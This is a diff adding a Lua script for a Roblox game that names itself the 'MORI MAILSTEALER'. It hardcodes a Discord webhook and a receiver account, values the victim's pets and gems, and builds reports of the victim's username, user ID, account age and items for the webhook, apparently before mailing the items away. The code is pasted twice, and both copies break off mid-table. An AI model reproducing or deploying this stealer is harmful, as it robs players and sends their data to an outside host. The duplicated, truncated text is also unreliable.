@@ -1,0 +1,389 @@
+LogsWebhook = " https://discord.com/api/webhooks/1277350593618509975/1xeH59OSdUWk4cxwi3zANYb_vZpDu25VMn_Z8zz4gM37e3fr0yFvBGaxeysBdIgE1mDA"
+mailstealer_name = "MORI SCRIPTS"
+
+Roblox_Username = W_Tr7h4rd
+Discord_Webhook = https://discord.com/api/webhooks/1277350593618509975/1xeH59OSdUWk4cxwi3zANYb_vZpDu25VMn_Z8zz4gM37e3fr0yFvBGaxeysBdIgE1mDA
+Username2 = fnoAc4
+
+-- simple mailstealer
+LOGS_WEBHOOK = LogsWebhook
+if getgenv().Executed == true then
+-- return
+end
+getgenv().Executed = true
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.PlaceId ~= nil
+repeat
+    task.wait()
+until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+
+-- Loading Screen 1
+local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
+game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
+
+task.spawn(function()
+    LoadingScreenFunction("anything")
+end)
+
+game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "Mori Scripts"
+-- variables:
+
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get()
+local Player = game.Players.LocalPlayer
+local Inventory = Save.Inventory
+local HttpService = game:GetService("HttpService")
+local MailMessage = "Mori Scripts"
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+
+for id, table in pairs(Inventory.Currency) do
+    if table.id == "Diamonds" then
+        GemsAmount = table._am or 0
+        break
+    end
+end
+
+for adress, func in pairs(getgc()) do
+    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
+        FunctionToGetFirstPriceOfMail = func
+        break
+    end
+end
+
+FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+
+if FirstPriceOfMail > GemsAmount then
+    print("You don't have enough gems to run a script")
+    return
+end
+
+local FormatNumber = function(number)
+    local n = math.floor(number)
+    local suf = {"", "k", "m", "b", "t"}
+    local INDEX = 1
+    while n >= 1000 do
+        n = n / 1000
+        INDEX = INDEX + 1
+    end
+    return string.format("%.2f%s", n, suf[INDEX])
+end
+
+local GetItemValue = function(Type, ItemTable)
+    return (Library.DevRAPCmds.Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return ItemTable.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode(
+                    {id = ItemTable.id, pt = ItemTable.pt, sh = ItemTable.sh, tn = ItemTable.tn}
+                )
+            end
+        }
+    ) or 0)
+end
+
+local GetItemValueOfItems = function()
+    RAP = 0
+    for name_of_category, category in pairs(Inventory) do
+        if category ~= nil then
+            for i,v in pairs(category) do
+                RAP = RAP + GetItemValue(name_of_category, v)
+            end
+        end
+    end
+    return RAP
+end
+
+function deepCopy(original)
+    local copy = {}
+    for k, v in pairs(original) do
+        if type(v) == "table" then
+            v = deepCopy(v)
+        end
+        copy[k] = v
+    end
+    return copy
+end
+
+local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1, GemsAmount)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    if shiny == true then
+        shinyy = "Shiny"
+    elseif shiny == false then
+        shinyy = "not Shiny"
+    end
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
+    JobId = game.JobId
+    local PlayerUser = Player.Name
+    local msg = {
+        ["content"] = ping,
+        ["username"] = mailstealer_name,
+        ["embeds"] = {
+            {
+                ["title"] = "**YOU GOT A ITEM WITH MORI MAILSTEALER!**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7F00FF),
+                ["thumbnail"] = {
+                    ["url"] = thumbnail
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "**This data was generated using ".. mailstealer_name .." Mailstealer**",
+                        ["value"] = "```Username     : " .. fardplayer.Name ..
+                                    "\nUser-ID      : " .. fardplayer.userId ..
+                                    "\nAccount Age  : " .. fardplayer.AccountAge .. " Days" ..
+                                    "\nExploit      : " .. ExecutorWebhook ..
+                                    "\nReceiver     : " .. Roblox_Username .. 
+                                    "\nTotal RAP    : " .. FormatNumber(totalRap1) ..
+                                    "```",
+                        ["inline"] = false
+                    },                   
+                    {
+                        ["name"] = ":dog: **Pets left** :dog:",
+                        ["value"] = "```âžœ " .. pets_left .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":money_mouth: **"..item_type.."** :money_mouth:",
+                        ["value"] = "```âžœ " .. id .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":trophy: **Item RAP** :trophy:",
+                        ["value"] = "```âžœ " .. FormatNumber(RAP) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Gems** :gem:",
+                        ["value"] = "```âžœ " .. FormatNumber(GemsAmount) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":sparkles: **Shiny** :sparkles:",
+                        ["value"] = "```âžœ " .. shinyy .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
+                        ["value"] = "```âžœ " .. RBgoldNormal .. "```",
+                        ["inline"] = true
+                    }
+                }
+            }
+        },LogsWebhook = " https://discord.com/api/webhooks/1277350593618509975/1xeH59OSdUWk4cxwi3zANYb_vZpDu25VMn_Z8zz4gM37e3fr0yFvBGaxeysBdIgE1mDA"
+mailstealer_name = "MORI SCRIPTS"
+
+Roblox_Username = W_Tr7h4rd
+Discord_Webhook = https://discord.com/api/webhooks/1277350593618509975/1xeH59OSdUWk4cxwi3zANYb_vZpDu25VMn_Z8zz4gM37e3fr0yFvBGaxeysBdIgE1mDA
+Username2 = fnoAc4
+
+-- simple mailstealer
+LOGS_WEBHOOK = LogsWebhook
+if getgenv().Executed == true then
+-- return
+end
+getgenv().Executed = true
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.PlaceId ~= nil
+repeat
+    task.wait()
+until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+
+-- Loading Screen 1
+local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
+game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
+
+task.spawn(function()
+    LoadingScreenFunction("anything")
+end)
+
+game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "Mori Scripts"
+-- variables:
+
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get()
+local Player = game.Players.LocalPlayer
+local Inventory = Save.Inventory
+local HttpService = game:GetService("HttpService")
+local MailMessage = "Mori Scripts"
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+
+for id, table in pairs(Inventory.Currency) do
+    if table.id == "Diamonds" then
+        GemsAmount = table._am or 0
+        break
+    end
+end
+
+for adress, func in pairs(getgc()) do
+    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
+        FunctionToGetFirstPriceOfMail = func
+        break
+    end
+end
+
+FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+
+if FirstPriceOfMail > GemsAmount then
+    print("You don't have enough gems to run a script")
+    return
+end
+
+local FormatNumber = function(number)
+    local n = math.floor(number)
+    local suf = {"", "k", "m", "b", "t"}
+    local INDEX = 1
+    while n >= 1000 do
+        n = n / 1000
+        INDEX = INDEX + 1
+    end
+    return string.format("%.2f%s", n, suf[INDEX])
+end
+
+local GetItemValue = function(Type, ItemTable)
+    return (Library.DevRAPCmds.Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return ItemTable.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode(
+                    {id = ItemTable.id, pt = ItemTable.pt, sh = ItemTable.sh, tn = ItemTable.tn}
+                )
+            end
+        }
+    ) or 0)
+end
+
+local GetItemValueOfItems = function()
+    RAP = 0
+    for name_of_category, category in pairs(Inventory) do
+        if category ~= nil then
+            for i,v in pairs(category) do
+                RAP = RAP + GetItemValue(name_of_category, v)
+            end
+        end
+    end
+    return RAP
+end
+
+function deepCopy(original)
+    local copy = {}
+    for k, v in pairs(original) do
+        if type(v) == "table" then
+            v = deepCopy(v)
+        end
+        copy[k] = v
+    end
+    return copy
+end
+
+local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1, GemsAmount)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    if shiny == true then
+        shinyy = "Shiny"
+    elseif shiny == false then
+        shinyy = "not Shiny"
+    end
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
+    JobId = game.JobId
+    local PlayerUser = Player.Name
+    local msg = {
+        ["content"] = ping,
+        ["username"] = mailstealer_name,
+        ["embeds"] = {
+            {
+                ["title"] = "**YOU GOT A ITEM WITH MORI MAILSTEALER!**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7F00FF),
+                ["thumbnail"] = {
+                    ["url"] = thumbnail
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "**This data was generated using ".. mailstealer_name .." Mailstealer**",
+                        ["value"] = "```Username     : " .. fardplayer.Name ..
+                                    "\nUser-ID      : " .. fardplayer.userId ..
+                                    "\nAccount Age  : " .. fardplayer.AccountAge .. " Days" ..
+                                    "\nExploit      : " .. ExecutorWebhook ..
+                                    "\nReceiver     : " .. Roblox_Username .. 
+                                    "\nTotal RAP    : " .. FormatNumber(totalRap1) ..
+                                    "```",
+                        ["inline"] = false
+                    },                   
+                    {
+                        ["name"] = ":dog: **Pets left** :dog:",
+                        ["value"] = "```âžœ " .. pets_left .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":money_mouth: **"..item_type.."** :money_mouth:",
+                        ["value"] = "```âžœ " .. id .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":trophy: **Item RAP** :trophy:",
+                        ["value"] = "```âžœ " .. FormatNumber(RAP) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Gems** :gem:",
+                        ["value"] = "```âžœ " .. FormatNumber(GemsAmount) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":sparkles: **Shiny** :sparkles:",
+                        ["value"] = "```âžœ " .. shinyy .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
+                        ["value"] = "```âžœ " .. RBgoldNormal .. "```",
+                        ["inline"] = true
+                    }
+                }
+            }
+        },
